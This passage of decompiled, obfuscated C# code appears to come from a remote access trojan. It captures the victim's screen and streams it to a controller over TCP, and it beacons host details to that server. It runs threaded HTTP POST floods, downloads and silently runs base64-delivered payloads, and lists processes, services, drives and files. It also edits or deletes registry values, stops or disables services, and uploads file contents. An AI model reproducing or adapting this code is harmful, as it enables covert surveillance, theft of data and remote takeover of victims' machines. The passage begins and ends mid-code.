			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 2)), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 1)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ12.Add(item);
			List<Rectangle> unInjxEHzZ13 = UnInjxEHzZ171;
			item = new Rectangle(0, (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 2)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ13.Add(item);
			List<Rectangle> unInjxEHzZ14 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 2)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ14.Add(item);
			List<Rectangle> unInjxEHzZ15 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 1)), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 2)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ15.Add(item);
			List<Rectangle> unInjxEHzZ16 = UnInjxEHzZ171;
			item = new Rectangle((int)Math.Round((double)bCba0fBw801IW53.Width / 4.0 + (double)(PkoMNZJC3i169 * 2)), (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0 + (double)(CwGQj1offe170 * 2)), PkoMNZJC3i169, CwGQj1offe170);
			unInjxEHzZ16.Add(item);
		}
	}

	private void oW4RHdnZiGW7R152(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		try
		{
			while (qjMADzRH3jB3L14)
			{
				try
				{
					string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
					string text = null;
					EncoderParameters val = new EncoderParameters(1);
					val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
					ImageCodecInfo val2 = EqCed4lNA73fI106("image/jpeg");
					Bitmap val3 = new Bitmap(bCba0fBw801IW53.Width, bCba0fBw801IW53.Height, (PixelFormat)135173);
					checked
					{
						PkoMNZJC3i169 = (int)Math.Round((double)bCba0fBw801IW53.Width / 4.0);
						CwGQj1offe170 = (int)Math.Round((double)bCba0fBw801IW53.Height / 4.0);
						Bitmap val4 = new Bitmap(PkoMNZJC3i169, CwGQj1offe170, (PixelFormat)135173);
						Size size = new Size(PkoMNZJC3i169, CwGQj1offe170);
						Graphics val5 = Graphics.FromImage((Image)(object)val3);
						val5.CopyFromScreen(bCba0fBw801IW53.X, bCba0fBw801IW53.Y, 0, 0, bCba0fBw801IW53.Size, (CopyPixelOperation)13369376);
						int num = 0;
						do
						{
							try
							{
								Bitmap val6 = val3.Clone(UnInjxEHzZ171[num], (PixelFormat)135173);
								val5 = Graphics.FromImage((Image)(object)val4);
								val5.set_InterpolationMode((InterpolationMode)7);
								val5.set_CompositingQuality((CompositingQuality)2);
								val5.DrawImage((Image)(object)val6, 0, 0, PkoMNZJC3i169, CwGQj1offe170);
								MemoryStream memoryStream = new MemoryStream();
								if (Conversions.ToDouble(array[0]) > 75.0)
								{
									((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								}
								else
								{
									((Image)val4).Save((Stream)memoryStream, val2, val);
								}
								memoryStream.Capacity = (int)memoryStream.Length;
								try
								{
									if (num < 10)
									{
										QCyv5JL2VG173 = "0" + Conversions.ToString(num);
									}
									else
									{
										QCyv5JL2VG173 = Conversions.ToString(num);
									}
									if (memoryStream.Length != ob1HMTwzaS172[num])
									{
										byte[] buffer = memoryStream.GetBuffer();
										text = Convert.ToBase64String(buffer);
										buffer = null;
										try
										{
											XlhPz2rTPpQC970.WriteLine("/STARTSE0/" + QCyv5JL2VG173 + text);
											XlhPz2rTPpQC970.Flush();
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											return;
										}
										int_2++;
									}
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
								ob1HMTwzaS172[num] = (int)memoryStream.Length;
								memoryStream.Dispose();
								memoryStream.Close();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							num++;
						}
						while (num <= 15);
						((Image)val4).Dispose();
						((Image)val3).Dispose();
						val5.Dispose();
						GC.Collect();
						text = null;
						try
						{
							XlhPz2rTPpQC970.WriteLine("/STARTSET/");
							XlhPz2rTPpQC970.Flush();
							break;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							break;
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void tLpDoi0TcRQ8p153(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			try
			{
				while (qjMADzRH3jB3L14)
				{
					try
					{
						string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
						string text = null;
						EncoderParameters val = new EncoderParameters(1);
						val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
						ImageCodecInfo val2 = EqCed4lNA73fI106("image/jpeg");
						Bitmap val3 = new Bitmap(bCba0fBw801IW53.Width, bCba0fBw801IW53.Height, (PixelFormat)135173);
						PkoMNZJC3i169 = bCba0fBw801IW53.Width;
						CwGQj1offe170 = bCba0fBw801IW53.Height;
						new Bitmap(PkoMNZJC3i169, CwGQj1offe170, (PixelFormat)135173);
						Size size = new Size(PkoMNZJC3i169, CwGQj1offe170);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						val4.CopyFromScreen(bCba0fBw801IW53.X, bCba0fBw801IW53.Y, 0, 0, bCba0fBw801IW53.Size, (CopyPixelOperation)13369376);
						MemoryStream memoryStream = new MemoryStream();
						if (Conversions.ToDouble(array[0]) > 75.0)
						{
							((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						}
						else
						{
							((Image)val3).Save((Stream)memoryStream, val2, val);
						}
						checked
						{
							memoryStream.Capacity = (int)memoryStream.Length;
							if (memoryStream.Length == l123UrvZ4p175)
							{
								try
								{
									XlhPz2rTPpQC970.WriteLine("/STARTSEQ/SAME");
									XlhPz2rTPpQC970.Flush();
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
									break;
								}
							}
							else
							{
								byte[] buffer = memoryStream.GetBuffer();
								text = Convert.ToBase64String(buffer);
								buffer = null;
								try
								{
									XlhPz2rTPpQC970.WriteLine("/STARTSEQ/" + text);
									XlhPz2rTPpQC970.Flush();
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
									break;
								}
							}
							l123UrvZ4p175 = (int)memoryStream.Length;
							memoryStream.Dispose();
							memoryStream.Close();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					GC.Collect();
					break;
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Thread.Sleep(100);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void EHuAc2zwKlYgv154(object Tempdata)
	{
		int num = 0;
		do
		{
			try
			{
				if (!vP4moiOchA176)
				{
					break;
				}
				Type typeFromHandle = typeof(WebRequest);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "Create", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)obj;
				byte[] bytes = Encoding.UTF8.GetBytes("Hello");
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.Method = "POST";
				httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest2.ContentLength = bytes.Length;
				httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
				httpWebRequest2.Referer = "http://0mn3d6yunkn0wn.com";
				httpWebRequest2 = null;
				Stream requestStream = httpWebRequest.GetRequestStream();
				Stream stream = requestStream;
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				stream = null;
				requestStream = null;
				HttpWebResponse httpWebResponse = null;
				try
				{
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				}
				catch (WebException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					ProjectData.ClearProjectError();
				}
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest = null;
				httpWebResponse = null;
				responseStream = null;
				streamReader = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num = checked(num + 1);
		}
		while (num <= 100);
	}

	private void czM1AAAL6kdAo155(object Tempdata)
	{
		vP4moiOchA176 = true;
		int num = 0;
		while (vP4moiOchA176)
		{
			Thread thread = new Thread(EHuAc2zwKlYgv154);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
			num = checked(num + 1);
			if (num > 100)
			{
				break;
			}
		}
	}

	private void QP3c4dJhzFuHt156()
	{
		try
		{
			PleKopoP0M158 = new TcpClient();
			PleKopoP0M158.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
			DqsSBmrZv3159 = PleKopoP0M158.GetStream();
			h1uKoASIWy160 = new StreamWriter(DqsSBmrZv3159);
			q5V9bC3SVP49 q5V9bC3SVP50 = new q5V9bC3SVP49();
			string text = q5V9bC3SVP50.y1eXPkQF2X225();
			string text2 = q5V9bC3SVP50.YaBFYCaOG9237();
			string text3 = q5V9bC3SVP50.OnAvqWr7z0226();
			string text4 = q5V9bC3SVP50.mQqYWnovSe229();
			string text5 = q5V9bC3SVP50.UF48gHkIr5233();
			string text6 = q5V9bC3SVP50.zjbTntzntD234();
			string text7 = q5V9bC3SVP50.JLbL5EhHVw230();
			string text8 = q5V9bC3SVP50.tlKkjn477M235();
			string text9 = q5V9bC3SVP50.av6gBtO9MM236();
			string text10 = q5V9bC3SVP50.K5iWazVKPT238();
			string text11 = q5V9bC3SVP50.BrfJfBMNko217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			h1uKoASIWy160.WriteLine("/TRYPAAAA/" + ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Name() + "¦" + q07QX2zPwPcMi112(Conversions.ToString(obj), "&%#@?,:*"));
			h1uKoASIWy160.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void UykJprmS5q6ah157(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			if (Conversions.ToDouble(array[1]) == 1.0)
			{
				Process.Start(array[0]);
				return;
			}
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[0]);
			byte[] bytes = Encoding.UTF8.GetBytes("Hello");
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.Method = "POST";
			httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest2.ContentLength = bytes.Length;
			httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
			httpWebRequest2 = null;
			Stream requestStream = httpWebRequest.GetRequestStream();
			Stream stream = requestStream;
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
			stream = null;
			requestStream = null;
			HttpWebResponse httpWebResponse = null;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			}
			catch (WebException projectError)
			{
				ProjectData.SetProjectError((Exception)projectError);
				ProjectData.ClearProjectError();
			}
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
			httpWebRequest = null;
			httpWebResponse = null;
			responseStream = null;
			streamReader = null;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void fxExmhZNbJtxh158()
	{
		vP4moiOchA176 = false;
	}

	private void KweDTik6G2qmU159(object temp)
	{
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
			NetworkStream stream = tcpClient.GetStream();
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/TRYAVVVV/", temp), (object)"¦"), (object)yUKeIL104()));
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MdwKpW1MXbD1i160(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			string text2 = array.GetValue(0)!.ToString();
			if (Operators.CompareString(text2, "temp", false) == 0)
			{
				text2 = Path.GetTempPath();
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (!File.Exists(text2 + text))
			{
				byte[] array2 = Convert.FromBase64String(Conversions.ToString(array.GetValue(2)));
				((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().WriteAllBytes(text2 + text, array2, false);
				GmhWc9n87GxDM122(5);
			}
			string text3 = Conversions.ToString(array.GetValue(3));
			if (Operators.CompareString(text3, "0", false) == 0)
			{
				Process process = new Process();
				process.StartInfo.WorkingDirectory = text2;
				process.StartInfo.FileName = text2 + text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			else
			{
				Process process2 = new Process();
				process2.StartInfo.WorkingDirectory = text2;
				process2.StartInfo.FileName = text2 + text;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				process2.Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void dHGIOQb8GQEsw161()
	{
		try
		{
			Eew8M9Oujs135.WriteLine("/LISTPROC/" + so4NvU5zM4UE1117());
			Eew8M9Oujs135.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void OQbzvebrvMhrk162()
	{
		try
		{
			streamWriter_4.WriteLine("/LISTSERV/" + method_1());
			streamWriter_4.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void wwuNlBCB5CqYd163(object swfm)
	{
		try
		{
			string text = null;
			text = pLJaRXNXRh22N121();
			NewLateBinding.LateCall(swfm, (Type)null, "WriteLine", new object[1] { "/LISTDRVS/" + text }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swfm, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void zaM5nRiS8bBoF164(object Tempdata)
	{
		try
		{
			string text = null;
			string text2 = null;
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(Tempdata));
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Tempdata, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
			{
				text2 = "(DIR).*(DIR)..*";
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				text = "(DIR)" + directoryInfo2.get_Name();
				text2 = text2 + text + "*";
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				text = fileInfo.get_Name();
				text2 = text2 + text + "*";
			}
			lwTyp9d68gwn480.WriteLine("/ONLYONEP/" + text2);
			lwTyp9d68gwn480.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			lwTyp9d68gwn480.WriteLine("/ERRORDIR/(DIR).*(DIR)..");
			lwTyp9d68gwn480.Flush();
			ProjectData.ClearProjectError();
		}
	}

	private void oQQHVphukFDTu165(object Node)
	{
		string text = null;
		string[] array = null;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Node, (object)"CU", false))
			{
				array = Registry.CurrentUser.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"LM", false))
			{
				array = Registry.LocalMachine.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"US", false))
			{
				array = Registry.Users.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			dClTc2WPck150.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/REGYVIEW/", Node), (object)text));
			dClTc2WPck150.Flush();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				dClTc2WPck150.WriteLine("/REGVIEWS/" + text);
				dClTc2WPck150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void p8solToFcLKnH167(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '¦' });
			registryKey.SetValue(array2[0], array2[1]);
			JvPR4bmvKUypv170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			registryKey.DeleteValue(array[1], throwOnMissingValue: false);
			JvPR4bmvKUypv170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void PNnKPbixZ82Wk169(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '╫' });
			string[] array3 = array2[0].Split(new char[1] { '¦' });
			string[] array4 = array2[1].Split(new char[1] { '¦' });
			registryKey.DeleteValue(array4[0], throwOnMissingValue: false);
			registryKey.SetValue(array3[0], array3[1]);
			JvPR4bmvKUypv170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void JvPR4bmvKUypv170(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj));
			}
			if (array.Length <= 0)
			{
				return;
			}
			string[] array2 = array;
			foreach (object obj3 in array2)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Conversions.ToString(obj3)));
				if (objectValue == null)
				{
					continue;
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string text2 = null;
				try
				{
					if ((object)objectValue2.GetType() == typeof(byte[]))
					{
						text2 = Convert.ToBase64String((byte[])objectValue2) + "bytearraystring";
					}
					else
					{
						Encoding uTF = Encoding.UTF8;
						object[] array3 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
						bool[] array4 = new bool[1] { true };
						object obj4 = NewLateBinding.LateGet((object)uTF, (Type)null, "GetBytes", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							objectValue2 = RuntimeHelpers.GetObjectValue(array3[0]);
						}
						text2 = Convert.ToBase64String((byte[])obj4);
					}
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "¥"), obj3), (object)"§"), (object)text2)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(obj3, (object)"§"), (object)text2)));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				dClTc2WPck150.WriteLine("/REGVIEWV/" + text);
				dClTc2WPck150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void wevBGvZn3BirW171(object Tempdata)
	{
		try
		{
			Thread thread = new Thread(method_12);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void y4a1xHjbpG3Wn172(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			switch (array[1])
			{
			case "STOP":
			{
				wT64VYhGPw48 wT64VYhGPw5 = new wT64VYhGPw48(array[0]);
				((ServiceController)wT64VYhGPw5).Stop();
				break;
			}
			case "START":
			{
				wT64VYhGPw48 wT64VYhGPw4 = new wT64VYhGPw48(array[0]);
				((ServiceController)wT64VYhGPw4).Start();
				break;
			}
			case "DISABLE":
			{
				wT64VYhGPw48 wT64VYhGPw3 = new wT64VYhGPw48(array[0]);
				wT64VYhGPw3.StartupType = "Disabled";
				break;
			}
			case "MANUAL":
			{
				wT64VYhGPw48 wT64VYhGPw2 = new wT64VYhGPw48(array[0]);
				wT64VYhGPw2.StartupType = "Manual";
				break;
			}
			case "AUTO":
			{
				wT64VYhGPw48 wT64VYhGPw = new wT64VYhGPw48(array[0]);
				wT64VYhGPw.StartupType = "Auto";
				break;
			}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void L2r5TOlkE32ns173()
	{
		checked
		{
			try
			{
				if (JLJbMzr99djCj37 != aKGzZliCksPBM43)
				{
					StringBuilder stringBuilder = new StringBuilder();
					StringBuilder stringBuilder2 = new StringBuilder();
					JLJbMzr99djCj37++;
					byte_0 = new byte[i1kFOfoDoTEL735 - 1 + 1];
					uAwzoOVsWJ6E542.Read(byte_0, 0, i1kFOfoDoTEL735);
					bZXxQRfKNfiiA45 = uAwzoOVsWJ6E542.BaseStream.Seek(0L, SeekOrigin.Current);
					stringBuilder.Append("/PAKSSEND/");
					int num = byte_0.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						stringBuilder2.Append(byte_0.GetValue(i)!.ToString() + " ");
					}
					stringBuilder.Append((object?)stringBuilder2);
					lwTyp9d68gwn480.WriteLine((object?)stringBuilder);
					lwTyp9d68gwn480.Flush();
				}
				else if (Xd8dJadD7PBzt44 > 0L)
				{
					StringBuilder stringBuilder3 = new StringBuilder();
					StringBuilder stringBuilder4 = new StringBuilder();
					byte_0 = new byte[(int)(Xd8dJadD7PBzt44 - 1L) + 1];
					uAwzoOVsWJ6E542.Read(byte_0, 0, (int)Xd8dJadD7PBzt44);
					stringBuilder3.Append("/FINEDOWN/");
					int num2 = byte_0.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder4.Append(byte_0.GetValue(j)!.ToString() + " ");
					}
					stringBuilder3.Append((object?)stringBuilder4);
					lwTyp9d68gwn480.WriteLine((object?)stringBuilder3);
					lwTyp9d68gwn480.Flush();
					method_0();
				}
				else
				{
					lwTyp9d68gwn480.WriteLine("/FINEDOWN/");
					lwTyp9d68gwn480.Flush();
					method_0();
